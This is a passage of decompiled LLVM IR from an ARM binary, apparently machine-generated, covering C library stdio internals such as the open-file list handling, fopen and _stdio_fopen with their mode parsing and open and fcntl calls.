  %v1_15910 = add i32 %v0_15910, 129
  store i32 %v1_15910, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15924

dec_label_pc_15924:                               ; preds = %dec_label_pc_158b0, %dec_label_pc_15898, %dec_label_pc_1590c, %dec_label_pc_15904
  %v0_15924 = load i32, i32* @r5, align 4
  %v1_15924 = inttoptr i32 %v0_15924 to i16*
  %v2_15924 = load i16, i16* %v1_15924, align 2
  %v3_15924 = zext i16 %v2_15924 to i32
  store i32 %v3_15924, i32* %r3.global-to-local, align 4
  %v1_15928 = and i32 %v3_15924, 16384
  %v2_15928 = icmp eq i32 %v1_15928, 0
  br i1 %v2_15928, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_15924
  %v2_1592c = add i32 %v0_15924, 8
  %v3_1592c = inttoptr i32 %v2_1592c to i32*
  %v4_1592c = load i32, i32* %v3_1592c, align 4
  store i32 %v4_1592c, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_15924, %bb48
  %v1_15930 = xor i1 %v2_15928, true
  call void @__pseudo_cond_branch(i1 %v1_15930, i32 ptrtoint (i32* @global_var_12d7c.33 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15938 = load i32, i32* @r8, align 4
  %v2_15938 = add i32 %v0_15938, 160
  %v3_15938 = inttoptr i32 %v2_15938 to i32*
  %v4_15938 = load i32, i32* %v3_15938, align 4
  store i32 %v4_15938, i32* @r5, align 4
  %v1_1593c = add i32 %v4_15938, 8
  %v2_1593c = inttoptr i32 %v1_1593c to i32*
  %v3_1593c = load i32, i32* %v2_1593c, align 4
  store i32 %v3_1593c, i32* %r3.global-to-local, align 4
  %v1_15940 = load i32, i32* %sl.global-to-local, align 4
  %v3_15940 = icmp uge i32 %v3_1593c, %v1_15940
  store i1 %v3_15940, i1* %cpsr_c.global-to-local, align 1
  %v9_15940 = icmp eq i32 %v3_1593c, %v1_15940
  br i1 %v9_15940, label %dec_label_pc_15988, label %dec_label_pc_15948

dec_label_pc_15948:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_15938, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1595475 = inttoptr i32 %v4_15938 to i32*
  %v2_1595476 = load i32, i32* %v1_1595475, align 4
  store i32 %v2_1595476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1595878 = icmp eq i32 %v2_1595476, 0
  br i1 %v9_1595878, label %dec_label_pc_15960, label %dec_label_pc_15978

dec_label_pc_15960:                               ; preds = %dec_label_pc_15948, %dec_label_pc_15960.dec_label_pc_15954_crit_edge
  %v0_1596079 = phi i32 [ %v1_15958.pre, %dec_label_pc_15960.dec_label_pc_15954_crit_edge ], [ 0, %dec_label_pc_15948 ]
  store i32 %v0_1596079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15970 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15970, label %dec_label_pc_15974, label %dec_label_pc_15960.dec_label_pc_15954_crit_edge

dec_label_pc_15960.dec_label_pc_15954_crit_edge:  ; preds = %dec_label_pc_15960
  %v0_15954.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15958.pre = load i32, i32* @r4, align 4
  %v1_15954 = inttoptr i32 %v0_15954.pre to i32*
  %v2_15954 = load i32, i32* %v1_15954, align 4
  store i32 %v2_15954, i32* %r3.global-to-local, align 4
  %v3_15958 = icmp uge i32 %v2_15954, %v1_15958.pre
  store i1 %v3_15958, i1* %cpsr_c.global-to-local, align 1
  %v9_15958 = icmp eq i32 %v2_15954, %v1_15958.pre
  br i1 %v9_15958, label %dec_label_pc_15960, label %dec_label_pc_15978

dec_label_pc_15974:                               ; preds = %dec_label_pc_15960
  %v0_15974 = load i32, i32* @r4, align 4
  store i32 %v0_15974, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15978

dec_label_pc_15978:                               ; preds = %dec_label_pc_15948, %dec_label_pc_15960.dec_label_pc_15954_crit_edge, %dec_label_pc_15974
  %v0_15978 = phi i32 [ %v0_15974, %dec_label_pc_15974 ], [ %v2_1595476, %dec_label_pc_15948 ], [ %v2_15954, %dec_label_pc_15960.dec_label_pc_15954_crit_edge ]
  %v1_15978 = phi i32 [ %v0_15974, %dec_label_pc_15974 ], [ 0, %dec_label_pc_15948 ], [ %v1_15958.pre, %dec_label_pc_15960.dec_label_pc_15954_crit_edge ]
  %v3_15978 = icmp uge i32 %v0_15978, %v1_15978
  store i1 %v3_15978, i1* %cpsr_c.global-to-local, align 1
  %v9_15978 = icmp eq i32 %v0_15978, %v1_15978
  br i1 %v9_15978, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_15978
  %v1_1597c = load i32, i32* @r5, align 4
  store i32 %v1_1597c, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_15978, %bb50
  %v1_15980 = xor i1 %v9_15978, true
  call void @__pseudo_cond_branch(i1 %v1_15980, i32 ptrtoint (i32* @global_var_13f34.514 to i32))
  %v0_15984 = load i32, i32* %sl.global-to-local, align 4
  %v1_15984 = load i32, i32* @r5, align 4
  %v2_15984 = add i32 %v1_15984, 8
  %v3_15984 = inttoptr i32 %v2_15984 to i32*
  store i32 %v0_15984, i32* %v3_15984, align 4
  %v0_1598c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_15988

dec_label_pc_15988:                               ; preds = %bb49, %bb51
  %v0_1598c = phi i32 [ %v0_15938, %bb49 ], [ %v0_1598c.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_1598c = add i32 %v0_1598c, 80
  %v3_1598c = inttoptr i32 %v2_1598c to i32*
  %v4_1598c = load i32, i32* %v3_1598c, align 4
  store i32 %v4_1598c, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_15994 = add i32 %v0_1598c, 160
  %v3_15994 = inttoptr i32 %v2_15994 to i32*
  %v4_15994 = load i32, i32* %v3_15994, align 4
  store i32 %v4_15994, i32* %r0.global-to-local, align 4
  %v1_15998 = inttoptr i32 %v4_1598c to i32*
  %v2_15998 = load i32, i32* %v1_15998, align 4
  store i32 %v2_15998, i32* %r3.global-to-local, align 4
  %v1_1599c = add i32 %v4_15994, 4
  %v2_1599c = inttoptr i32 %v1_1599c to i32*
  %v3_1599c = load i32, i32* %v2_1599c, align 4
  store i32 %v3_1599c, i32* %r1.global-to-local, align 4
  %v1_159a0 = add i32 %v2_15998, 1
  store i32 %v1_159a0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_159a4 = icmp eq i32 %v3_1599c, 0
  store i32 %v1_159a0, i32* %v1_15998, align 4
  br i1 %v2_159a4, label %dec_label_pc_159b0, label %dec_label_pc_15a10

dec_label_pc_159b0:                               ; preds = %dec_label_pc_15988
  %v0_159b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_159b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_159b0 = add i32 %v1_159b0, 8
  %v3_159b0 = inttoptr i32 %v2_159b0 to i32*
  store i32 %v0_159b0, i32* %v3_159b0, align 4
  %v0_159b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_159b4, i32* @r5, align 4
  br label %dec_label_pc_159b8

dec_label_pc_159b8:                               ; preds = %dec_label_pc_159e8.dec_label_pc_159b8_crit_edge, %dec_label_pc_159b0
  %v0_159b8 = phi i32 [ %v0_159b8.pre, %dec_label_pc_159e8.dec_label_pc_159b8_crit_edge ], [ %v0_159b4, %dec_label_pc_159b0 ]
  %v1_159b8 = inttoptr i32 %v0_159b8 to i32*
  %v2_159b8 = load i32, i32* %v1_159b8, align 4
  store i32 %v2_159b8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_159b8, i32* %r2.global-to-local, align 4
  %v2_159c464 = load i32, i32* %v1_159b8, align 4
  store i32 %v2_159c464, i32* %r3.global-to-local, align 4
  %v3_159c866 = icmp uge i32 %v2_159c464, %v2_159b8
  store i1 %v3_159c866, i1* %cpsr_c.global-to-local, align 1
  %v9_159c872 = icmp eq i32 %v2_159c464, %v2_159b8
  br i1 %v9_159c872, label %dec_label_pc_159d0, label %dec_label_pc_159e8

dec_label_pc_159d0:                               ; preds = %dec_label_pc_159b8, %dec_label_pc_159d0.dec_label_pc_159c4_crit_edge
  %v0_159d073 = phi i32 [ %v1_159c8.pre, %dec_label_pc_159d0.dec_label_pc_159c4_crit_edge ], [ %v2_159b8, %dec_label_pc_159b8 ]
  store i32 %v0_159d073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_159e0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_159e0, label %dec_label_pc_159e4, label %dec_label_pc_159d0.dec_label_pc_159c4_crit_edge

dec_label_pc_159d0.dec_label_pc_159c4_crit_edge:  ; preds = %dec_label_pc_159d0
  %v0_159c4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_159c8.pre = load i32, i32* @r4, align 4
  %v1_159c4 = inttoptr i32 %v0_159c4.pre to i32*
  %v2_159c4 = load i32, i32* %v1_159c4, align 4
  store i32 %v2_159c4, i32* %r3.global-to-local, align 4
  %v3_159c8 = icmp uge i32 %v2_159c4, %v1_159c8.pre
  store i1 %v3_159c8, i1* %cpsr_c.global-to-local, align 1
  %v9_159c8 = icmp eq i32 %v2_159c4, %v1_159c8.pre
  br i1 %v9_159c8, label %dec_label_pc_159d0, label %dec_label_pc_159e8

dec_label_pc_159e4:                               ; preds = %dec_label_pc_159d0
  %v0_159e4 = load i32, i32* @r4, align 4
  store i32 %v0_159e4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_159e8

dec_label_pc_159e8:                               ; preds = %dec_label_pc_159b8, %dec_label_pc_159d0.dec_label_pc_159c4_crit_edge, %dec_label_pc_159e4
  %v0_159f0 = phi i32 [ %v0_159e4, %dec_label_pc_159e4 ], [ %v2_159c464, %dec_label_pc_159b8 ], [ %v2_159c4, %dec_label_pc_159d0.dec_label_pc_159c4_crit_edge ]
  %v1_159e8 = phi i32 [ %v0_159e4, %dec_label_pc_159e4 ], [ %v2_159b8, %dec_label_pc_159b8 ], [ %v1_159c8.pre, %dec_label_pc_159d0.dec_label_pc_159c4_crit_edge ]
  %v3_159e8 = icmp uge i32 %v0_159f0, %v1_159e8
  store i1 %v3_159e8, i1* %cpsr_c.global-to-local, align 1
  %v9_159e8 = icmp eq i32 %v0_159f0, %v1_159e8
  br i1 %v9_159e8, label %dec_label_pc_159f0, label %dec_label_pc_159e8.dec_label_pc_159b8_crit_edge

dec_label_pc_159e8.dec_label_pc_159b8_crit_edge:  ; preds = %dec_label_pc_159e8
  %v0_159b8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_159b8

dec_label_pc_159f0:                               ; preds = %dec_label_pc_159e8
  %v2_159f0 = icmp ne i32 %v1_159e8, 0
  store i1 %v2_159f0, i1* %cpsr_c.global-to-local, align 1
  %v7_159f4 = icmp slt i32 %v1_159e8, 2
  br i1 %v7_159f4, label %dec_label_pc_15a10, label %dec_label_pc_159f8

dec_label_pc_159f8:                               ; preds = %dec_label_pc_159f0
  %v0_159f8 = load i32, i32* @r5, align 4
  store i32 %v0_159f8, i32* %r0.global-to-local, align 4
  %v0_159fc = load i32, i32* %r1.global-to-local, align 4
  %v1_159fc = add i32 %v0_159fc, 129
  store i32 %v1_159fc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15a10

dec_label_pc_15a10:                               ; preds = %dec_label_pc_15988, %dec_label_pc_159f8, %dec_label_pc_159f0
  %v0_15a10 = call i32 @_stdio_openlist_dec_use()
  %v0_15a14 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_15a14, i32* %r0.global-to-local, align 4
  %v2_15a1c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_15a1c, i32* @r4, align 4
  store i32 %v6_15704, i32* @r5, align 4
  store i32 %v9_15704, i32* @r6, align 4
  store i32 %v12_15704, i32* @r7, align 4
  ret i32 %v0_15a14

; uselistorder directives
  uselistorder i32 %v0_159e4, { 1, 0, 2 }
  uselistorder i32 %v1_159c8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_159b8, { 1, 0 }
  uselistorder i32 %v0_1598c, { 1, 0 }
  uselistorder i32 %v0_15974, { 1, 0, 2 }
  uselistorder i32 %v1_15958.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_15940, { 1, 0 }
  uselistorder i32 %v0_158f8, { 1, 0, 2 }
  uselistorder i32 %v1_158dc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1586c, { 1, 0, 2 }
  uselistorder i32 %v1_15850.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15840, { 1, 0 }
  uselistorder i32 %v0_157fc, { 1, 0, 2 }
  uselistorder i32 %v1_157e0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_157c0, { 1, 0 }
  uselistorder i32 %v1_1574c.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 6, 5, 0, 7, 8, 9, 10, 11, 13, 12, 45, 14, 17, 15, 16, 18, 20, 19, 46, 21, 22, 23, 24, 25, 27, 26, 44, 28, 29, 30, 31, 33, 32, 1, 34, 35, 36, 37, 38, 39, 40, 42, 41, 2, 43 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 5, 6, 7, 34, 35, 8, 9, 11, 10, 1, 12, 13, 14, 16, 15, 0, 17, 18, 19, 20, 22, 21, 4, 23, 24, 26, 25, 2, 27, 28, 29, 31, 30, 3, 32, 33 }
  uselistorder i32 (i32)* @__GI___libc_close, { 29, 28, 27, 26, 32, 25, 31, 30, 3, 2, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 1, 0 }
  uselistorder label %dec_label_pc_15a10, { 1, 2, 0 }
  uselistorder label %dec_label_pc_159e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_159d0, { 1, 0 }
  uselistorder label %dec_label_pc_15988, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_15978, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15960, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_15924, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_158fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_158e4, { 1, 0 }
  uselistorder label %dec_label_pc_15898, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15870, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15858, { 1, 0 }
  uselistorder label %dec_label_pc_15810, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_15800, { 2, 1, 0 }
  uselistorder label %dec_label_pc_157e8, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_15788, { 1, 0 }
  uselistorder label %dec_label_pc_1577c, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_1576c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15754, { 1, 0 }
}

define i32 @function_15a28(i32 %arg1) local_unnamed_addr {
dec_label_pc_15a28:
  %v0_15a28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15a28, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15a28
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15a28, %bb
  %v10_15a30 = phi i32 [ %arg1, %dec_label_pc_15a28 ], [ 0, %bb ]
  ret i32 %v10_15a30

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_15a44 = call i32 @_stdio_fopen()
  ret i32 %v0_15a44
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_15a54 = load i32, i32* @r4, align 4
  store i32 %v3_15a54, i32* %stack_var_-24, align 4
  %v6_15a54 = load i32, i32* @r5, align 4
  %v9_15a54 = load i32, i32* @r6, align 4
  %v12_15a54 = load i32, i32* @r7, align 4
  %v15_15a54 = load i32, i32* @r8, align 4
  %v0_15a58 = load i32, i32* @r1, align 4
  %v1_15a58 = inttoptr i32 %v0_15a58 to i8*
  %v2_15a58 = load i8, i8* %v1_15a58, align 1
  %v2_15a60 = icmp ugt i8 %v2_15a58, 113
  store i1 %v2_15a60, i1* %cpsr_c.global-to-local, align 1
  %v7_15a60 = icmp eq i8 %v2_15a58, 114
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r8, align 4
  %v0_15a6c = load i32, i32* @r0, align 4
  store i32 %v0_15a6c, i32* @r7, align 4
  %v0_15a70 = load i32, i32* @r2, align 4
  store i32 %v0_15a70, i32* @r5, align 4
  %v0_15a74 = load i32, i32* @r3, align 4
  store i32 %v0_15a74, i32* @r6, align 4
  br i1 %v7_15a60, label %dec_label_pc_15ac8, label %dec_label_pc_15a7c

dec_label_pc_15a7c:                               ; preds = %entry
  %v2_15a7c = icmp ugt i8 %v2_15a58, 118
  store i1 %v2_15a7c, i1* %cpsr_c.global-to-local, align 1
  %v7_15a7c = icmp eq i8 %v2_15a58, 119
  br i1 %v7_15a7c, label %bb, label %dec_label_pc_15a88

bb:                                               ; preds = %dec_label_pc_15a7c
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_15acc

dec_label_pc_15a88:                               ; preds = %dec_label_pc_15a7c
  %v2_15a88 = icmp ugt i8 %v2_15a58, 96
  store i1 %v2_15a88, i1* %cpsr_c.global-to-local, align 1
  %v7_15a88 = icmp eq i8 %v2_15a58, 97
  br i1 %v7_15a88, label %bb49, label %dec_label_pc_15a94

bb49:                                             ; preds = %dec_label_pc_15a88
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_15acc

dec_label_pc_15a94:                               ; preds = %dec_label_pc_15a88, %dec_label_pc_15b64, %dec_label_pc_15b38
  store i32 49044, i32* %r2.global-to-local, align 4
  %v0_15a98 = call i32 @__aeabi_read_tp()
  store i32 %v0_15a98, i32* %r0.global-to-local, align 4
  %v3_15a9c = load i16, i16* @global_var_21a38.351, align 2
  %v4_15a9c = sext i16 %v3_15a9c to i32
  store i32 %v4_15a9c, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_15aa4 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15aa4 = icmp eq i32 %v0_15aa4, 0
  %v3_15aa8 = add i32 %v4_15a9c, %v0_15a98
  %v4_15aa8 = inttoptr i32 %v3_15aa8 to i32*
  store i32 22, i32* %v4_15aa8, align 4
  br i1 %v2_15aa4, label %dec_label_pc_15e6c, label %dec_label_pc_15ab0

dec_label_pc_15ab0:                               ; preds = %dec_label_pc_15b88._crit_edge, %dec_label_pc_15a94
  %v0_15ab0 = load i32, i32* @r5, align 4
  %v1_15ab0 = inttoptr i32 %v0_15ab0 to i16*
  %v2_15ab0 = load i16, i16* %v1_15ab0, align 2
  %v3_15ab0 = zext i16 %v2_15ab0 to i32
  store i32 %v3_15ab0, i32* %r3.global-to-local, align 4
  %v1_15ab4 = and i32 %v3_15ab0, 8192
  %v2_15ab4 = icmp eq i32 %v1_15ab4, 0
  br i1 %v2_15ab4, label %dec_label_pc_15e6c, label %dec_label_pc_15abc

dec_label_pc_15abc:                               ; preds = %dec_label_pc_15ab0
  store i32 %v0_15ab0, i32* @r0, align 4
  %v0_15ac0 = call i32 @free()
  store i32 %v0_15ac0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15e6c

dec_label_pc_15ac8:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_15acc

dec_label_pc_15acc:                               ; preds = %bb, %bb49, %dec_label_pc_15ac8
  %v1_15ae4 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_15ac8 ]
  %v1_15acc = add i32 %v0_15a58, 1
  %v2_15acc = inttoptr i32 %v1_15acc to i8*
  %v3_15acc = load i8, i8* %v2_15acc, align 1
  %v2_15ad0 = icmp ugt i8 %v3_15acc, 97
  store i1 %v2_15ad0, i1* %cpsr_c.global-to-local, align 1
  %v7_15ad0 = icmp eq i8 %v3_15acc, 98
  %v1_15acc.v0_15a58 = select i1 %v7_15ad0, i32 %v1_15acc, i32 %v0_15a58
  store i32 %v1_15acc.v0_15a58, i32* %r3.global-to-local, align 4
  %v1_15adc = add i32 %v1_15acc.v0_15a58, 1
  %v2_15adc = inttoptr i32 %v1_15adc to i8*
  %v3_15adc = load i8, i8* %v2_15adc, align 1
  %v4_15adc = zext i8 %v3_15adc to i32
  store i32 %v4_15adc, i32* @r3, align 4
  %v2_15ae0 = icmp ugt i8 %v3_15adc, 42
  store i1 %v2_15ae0, i1* %cpsr_c.global-to-local, align 1
  %v7_15ae0 = icmp eq i8 %v3_15adc, 43
  br i1 %v7_15ae0, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_15acc
  store i32 %v1_15ae4, i32* @r3, align 4
  %v2_15ae8 = add nuw nsw i32 %v1_15ae4, 1
  store i32 %v2_15ae8, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_15acc, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15aec = icmp eq i32 %v0_15a70, 0
  br i1 %v2_15aec, label %dec_label_pc_15af4, label %dec_label_pc_15b30

dec_label_pc_15af4:                               ; preds = %.thread3
  store i32 68, i32* @r0, align 4
  %v0_15af8 = call i32 @malloc()
  store i32 %v0_15af8, i32* %r0.global-to-local, align 4
  store i32 %v0_15af8, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_15afc = icmp eq i32 %v0_15af8, 0
  br i1 %v3_15afc, label %dec_label_pc_15e70, label %dec_label_pc_15b04

dec_label_pc_15b04:                               ; preds = %dec_label_pc_15af4
  %v0_15b08 = load i32, i32* @r8, align 4
  %v2_15b08 = add i32 %v0_15b08, -33136
  store i32 %v2_15b08, i32* %r3.global-to-local, align 4
  %v1_15b0c = inttoptr i32 %v2_15b08 to i32*
  %v2_15b0c = load i32, i32* %v1_15b0c, align 4
  store i32 %v2_15b0c, i32* %r0.global-to-local, align 4
  %v3_15b0c = add i32 %v0_15b08, -33132
  %v4_15b0c = inttoptr i32 %v3_15b0c to i32*
  %v5_15b0c = load i32, i32* %v4_15b0c, align 4
  store i32 %v5_15b0c, i32* @r1, align 4
  %v6_15b0c = add i32 %v0_15b08, -33128
  %v7_15b0c = inttoptr i32 %v6_15b0c to i32*
  %v8_15b0c = load i32, i32* %v7_15b0c, align 4
  store i32 %v8_15b0c, i32* %r2.global-to-local, align 4
  %v2_15b18 = add i32 %v0_15af8, 8
  %v3_15b18 = inttoptr i32 %v2_15b18 to i32*
  store i32 0, i32* %v3_15b18, align 4
  %v2_15b20 = load i32, i32* @r5, align 4
  %v3_15b20 = inttoptr i32 %v2_15b20 to i16*
  store i16 8192, i16* %v3_15b20, align 2
  %v2_15b24 = load i32, i32* %r0.global-to-local, align 4
  %v0_15b28 = load i32, i32* @r5, align 4
  %v1_15b28 = add i32 %v0_15b28, 56
  store i32 %v1_15b28, i32* @r3, align 4
  %v1_15b2c = inttoptr i32 %v1_15b28 to i32*
  store i32 %v2_15b24, i32* %v1_15b2c, align 4
  %v3_15b2c = add i32 %v0_15b28, 60
  %v4_15b2c = inttoptr i32 %v3_15b2c to i32*
  %v5_15b2c = load i32, i32* @r1, align 4
  store i32 %v5_15b2c, i32* %v4_15b2c, align 4
  %v6_15b2c = add i32 %v0_15b28, 64
  %v7_15b2c = inttoptr i32 %v6_15b2c to i32*
  %v8_15b2c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_15b2c, i32* %v7_15b2c, align 4
  %v0_15b30.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15b30

dec_label_pc_15b30:                               ; preds = %.thread3, %dec_label_pc_15b04
  %v0_15b88 = phi i32 [ %v0_15a74, %.thread3 ], [ %v0_15b30.pre, %dec_label_pc_15b04 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15b30 = icmp slt i32 %v0_15b88, 0
  br i1 %v1_15b30, label %dec_label_pc_15b88, label %dec_label_pc_15b38

dec_label_pc_15b38:                               ; preds = %dec_label_pc_15b30
  %v0_15b3c = load i32, i32* @r4, align 4
  %v2_15b3c = and i32 %v0_15b3c, 131075
  %v1_15b40 = add nuw nsw i32 %v2_15b3c, 1
  store i32 %v1_15b40, i32* %r2.global-to-local, align 4
  %v0_15b44 = load i32, i32* @r7, align 4
  %v1_15b44 = add i32 %v0_15b44, 1
  %v2_15b48 = and i32 %v1_15b44, %v1_15b40
  store i32 %v2_15b48, i32* %r3.global-to-local, align 4
  %v3_15b4c = icmp uge i32 %v2_15b48, %v1_15b40
  store i1 %v3_15b4c, i1* %cpsr_c.global-to-local, align 1
  %v9_15b4c = icmp eq i32 %v2_15b48, %v1_15b40
  %v1_15b50 = load i32, i32* @r5, align 4
  %v2_15b50 = add i32 %v1_15b50, 4
  %v3_15b50 = inttoptr i32 %v2_15b50 to i32*
  store i32 %v0_15b88, i32* %v3_15b50, align 4
  br i1 %v9_15b4c, label %dec_label_pc_15b58, label %dec_label_pc_15a94

dec_label_pc_15b58:                               ; preds = %dec_label_pc_15b38
  %v0_15b58 = load i32, i32* @r4, align 4
  %v1_15b58 = load i32, i32* @r7, align 4
  %v2_15b58 = sub i32 -1, %v1_15b58
  %v3_15b58 = and i32 %v0_15b58, %v2_15b58
  store i32 %v3_15b58, i32* @r3, align 4
  %v1_15b5c = and i32 %v3_15b58, 1024
  %v2_15b5c = icmp eq i32 %v1_15b5c, 0
  br i1 %v2_15b5c, label %dec_label_pc_15b7c, label %dec_label_pc_15b64

dec_label_pc_15b64:                               ; preds = %dec_label_pc_15b58
  %v0_15b64 = load i32, i32* @r6, align 4
  store i32 %v0_15b64, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_15b70 = call i32 @__libc_fcntl(i32 %v0_15b64, i32 4)
  store i32 %v2_15b70, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15b74 = icmp eq i32 %v2_15b70, 0
  br i1 %v2_15b74, label %dec_label_pc_15b64.dec_label_pc_15b7c_crit_edge, label %dec_label_pc_15a94

dec_label_pc_15b64.dec_label_pc_15b7c_crit_edge:  ; preds = %dec_label_pc_15b64
  %v0_15b7c.pre = load i32, i32* @r7, align 4
  %v0_15b80.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15b7c

dec_label_pc_15b7c:                               ; preds = %dec_label_pc_15b64.dec_label_pc_15b7c_crit_edge, %dec_label_pc_15b58
  %v0_15b80 = phi i32 [ %v0_15b80.pre, %dec_label_pc_15b64.dec_label_pc_15b7c_crit_edge ], [ %v0_15b58, %dec_label_pc_15b58 ]
  %v0_15b7c = phi i32 [ %v0_15b7c.pre, %dec_label_pc_15b64.dec_label_pc_15b7c_crit_edge ], [ %v1_15b58, %dec_label_pc_15b58 ]
  %v1_15b7c = and i32 %v0_15b7c, 131072
  store i32 %v1_15b7c, i32* %r3.global-to-local, align 4
  %v2_15b80 = or i32 %v1_15b7c, %v0_15b80
  store i32 %v2_15b80, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15bac

dec_label_pc_15b88:                               ; preds = %dec_label_pc_15b30
  %v2_15b88 = icmp eq i32 %v0_15b88, -1
  store i1 %v2_15b88, i1* %cpsr_c.global-to-local, align 1
  %v7_15b88 = icmp eq i32 %v0_15b88, -1
  %v0_15b94.pre = load i32, i32* @r4, align 4
  br i1 %v7_15b88, label %dec_label_pc_15b88._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_15b88
  %v2_15b8c = or i32 %v0_15b94.pre, 131072
  store i32 %v2_15b8c, i32* @r4, align 4
  br label %dec_label_pc_15b88._crit_edge

dec_label_pc_15b88._crit_edge:                    ; preds = %dec_label_pc_15b88, %bb53
  %v0_15b94 = phi i32 [ %v2_15b8c, %bb53 ], [ %v0_15b94.pre, %dec_label_pc_15b88 ]
  %v0_15b90 = load i32, i32* @r7, align 4
  store i32 %v0_15b90, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_15b9c = call i32 @__libc_open(i32 %v0_15b90, i32 %v0_15b94)
  store i32 %v2_15b9c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
